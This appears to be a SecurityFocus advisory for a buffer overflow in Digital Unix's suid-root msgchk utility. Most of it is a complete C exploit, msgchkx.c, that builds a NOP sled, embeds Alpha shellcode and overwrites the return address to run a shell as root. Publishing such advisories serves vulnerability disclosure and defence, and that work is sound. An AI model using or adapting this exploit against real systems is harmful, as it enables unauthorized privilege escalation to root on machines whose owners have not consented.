source: http://www.securityfocus.com/bid/3311/info

The msgchk utility under certain versions of Digital Unix contains a buffer overflow vulnerability which could yield root privilege.

If a local user invokes the msgchk utility at the command line, argumented with a sufficiently long string of bytes, a buffer overflow condition can be triggered. Where msgchk runs suid root, this can allow hostile code to be executed as root, granting an attacker administrative access to the vulnerable system. 

++ msgchkx.c

/*
 * 2001/09/05  - at the bench of windy fall
 * /usr/bin/mh/msgchk buffer overflow exploit code by truefinder ,
seo@igrus.inha.ac.kr
 * now we will drill /usr/bin/mh/msgchk
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define NOP             0x47ff041f
#define ALIGNSIZE       (4 + 1 )
#define BUFSIZE         (8000 + 211 )
#define RETADDR         0x000000011ffffaa0
#define DEFNOPSIZE      7168

char nop[] = { 0x1f, 0x04, 0xff, 0x47, 0x00 };
char retaddr[] = { 0xa0, 0xea, 0xff, 0x1f, 0x01 , 0x00 };

static char shellcode[] =
        "\x30\x15\xd9\x43"      /* subq $30,200,$16             */
        "\x11\x74\xf0\x47"      /* bis $31,0x83,$17             */
        "\x12\x94\x07\x42"      /* addq $16,60,$18              */
        "\xfc\xff\x32\xb2"      /* stl $17,-4($18)              */
        "\xff\x47\x3f\x26"      /* ldah $17,0x47ff($31)         */
        "\x1f\x04\x31\x22"      /* lda $17,0x041f($17)          */
        "\xfc\xff\x30\xb2"      /* stl $17,-4($16)              */
        "\xf9\xff\x1f\xd2"      /* bsr $16,-28                  */
        "\x30\x15\xd9\x43"      /* subq $30,200,$16             */
        "\x31\x15\xd8\x43"      /* subq $30,192,$17             */
        "\x12\x04\xff\x47"      /* clr $18                      */
        "\x40\xff\x1e\xb6"      /* stq $16,-192($30)            */
        "\x48\xff\xfe\xb7"      /* stq $31,-184($30)            */
        "\x98\xff\x7f\x26"      /* ldah $19,0xff98($31)         */
        "\xd0\x8c\x73\x22"      /* lda $19,0x8cd0($19)          */
        "\x13\x05\xf3\x47"      /* ornot $31,$19,$19            */
        "\x3c\xff\x7e\xb2"      /* stl $19,-196($30)            */
        "\x69\x6e\x7f\x26"      /* ldah $19,0x6e69($31)         */
        "\x2f\x62\x73\x22"      /* lda $19,0x622f($19)          */
        "\x38\xff\x7e\xb2"      /* stl $19,-200($30)            */
        "\x13\x94\xe7\x43"      /* addq $31,60,$19              */
        "\x20\x35\x60\x42"      /* subq $19,1,$0                */
        "\xff\xff\xff\xff";     /* callsys ( disguised )        */
        /* oh! this is ohhara's shellcode */

int
main(int argc, char  *argv[] )
{

        char *buf , *buf_ptr;
        int bufsize , alignsize , offset ;
        int i, totalsize;

        bufsize = BUFSIZE ; alignsize = ALIGNSIZE ; offset = 0 ;

        if ( argc < 1 ) {
                printf("usage : %s <bufsize> <align> <offset>\n",
argv[0]);
                exit (-1);
        }

        if (argc > 1 )
                bufsize = atoi( argv[1] );

        if ( argc > 2 )
                alignsize = atoi( argv[2] ) + ALIGNSIZE ;

        if ( argc > 3 )
                offset = atoi ( argv[3] );

        totalsize = alignsize + bufsize ;
         buf = malloc( totalsize ) ;


        memset ( buf, NULL , totalsize );

        memset ( buf, 'A', alignsize );
        buf_ptr = (char *)(buf + alignsize );

        /* default nop size is 4096 bytes */
        for ( i = 0 ; i < DEFNOPSIZE/4 ; i++ )
                strcat ( buf_ptr , nop );

        strcat ( buf_ptr, shellcode );

        /* fill the block with 'A' */
        for ( i =0 ; i < bufsize - DEFNOPSIZE - strlen(shellcode) - 8 ;
i++ )
                strcat( buf_ptr ,"A");

        strcat ( buf_ptr , retaddr );

        execl ("/var/tmp/mh/msgchk", "msgchk", buf, NULL );
}
